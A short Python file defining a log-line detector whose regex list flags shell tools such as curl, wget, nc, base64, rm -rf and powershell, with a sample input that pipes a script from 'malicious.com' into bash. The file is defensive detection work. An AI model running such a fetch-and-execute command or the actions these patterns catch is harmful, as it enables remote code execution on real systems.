import re

class CommandPatternDetector:
    suspicious_patterns = [
        r";\s*curl\s", r"wget\s", r"nc\s", r"ncat\s", r"\bbase64\b", r"eval\s", r"bash\s+-c",
        r"powershell\s", r"cmd\.exe", r"rm\s+-rf", r"scp\s", r"ftp\s", r"python\s+-c", r"php\s+-r"
    ]

    def detect_patterns(self, log_line: str):
        matches = []
        for pattern in self.suspicious_patterns:
            if re.search(pattern, log_line, re.IGNORECASE):
                matches.append(pattern)
        return matches

# Example usage
if __name__ == "__main__":
    detector = CommandPatternDetector()
    sample = "bash -c 'curl http://malicious.com/payload.sh | bash'"
    print("Detected patterns:", detector.detect_patterns(sample))
